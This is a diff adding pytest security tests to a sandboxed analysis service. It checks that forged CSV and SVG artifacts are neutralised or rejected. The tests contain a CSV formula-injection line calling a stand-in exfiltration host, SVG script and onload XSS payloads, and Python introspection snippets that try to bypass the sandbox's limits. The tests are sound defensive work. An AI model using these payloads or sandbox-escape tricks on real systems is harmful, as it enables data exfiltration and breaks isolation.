@@ -126,3 +126,38 @@ def test_source_limits_never_silently_truncate():
     assert "maximum" in analyze("output=1", [source("many.csv", b"x\n" * 10002)])["error"]
     assert "UnicodeDecodeError" in analyze("output=1", [source("invalid.csv", b"\xff")])["error"]
     assert "columns" in analyze("output=1", [source("wide.csv", ("," * 201).encode())])["error"]
+
+
+def test_introspection_fabricated_csv_is_neutralized_by_the_parent():
+    raw = b'value\n"=WEBSERVICE(""https://example.invalid/exfiltrate"")"\n-2\n'
+    item = {"name": "forged.csv", "mimeType": "text/csv", "contentBase64": base64.b64encode(raw).decode()}
+    result = analyze("emit_csv.__self__.items.append(inputs['item'])\noutput=1", inputs={"item": item})
+    assert result["output"] == 1, result
+    safe = base64.b64decode(result["artifacts"][0]["contentBase64"]).decode()
+    import csv
+    assert list(csv.reader(io.StringIO(safe))) == [["value"], ['\'=WEBSERVICE("https://example.invalid/exfiltrate")'], ["-2"]]
+
+
+@pytest.mark.parametrize("markup", [
+    '<script>alert(1)</script>',
+    '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">active</div></foreignObject>',
+    '<image href="https://example.invalid/exfiltrate"/>',
+    '<text onload="alert(1)">active</text>',
+    '<rect style="fill:url(https://example.invalid)"/>',
+    '<rect fill="url(https://example.invalid)"/>',
+])
+def test_introspection_fabricated_active_svg_never_leaves_service(markup):
+    raw = f'<svg xmlns="http://www.w3.org/2000/svg" width="900" height="520" viewBox="0 0 900 520">{markup}</svg>'.encode()
+    item = {"name": "forged.svg", "mimeType": "image/svg+xml", "contentBase64": base64.b64encode(raw).decode()}
+    result = analyze("emit_chart.__self__.items.append(inputs['item'])\noutput=1", inputs={"item": item})
+    assert "invalid analysis artifacts" in result["error"], result
+    assert "artifacts" not in result and "output" not in result
+
+
+def test_mutating_child_caps_cannot_bypass_parent_artifact_limits():
+    result = analyze(
+        "emit_csv.__func__.__globals__['MAX_ROWS']=20000\n"
+        "emit_csv('too-many.csv',['x'],[[1]]*10001)\noutput=1"
+    )
+    assert "invalid analysis artifacts" in result["error"], result
+    assert "artifacts" not in result
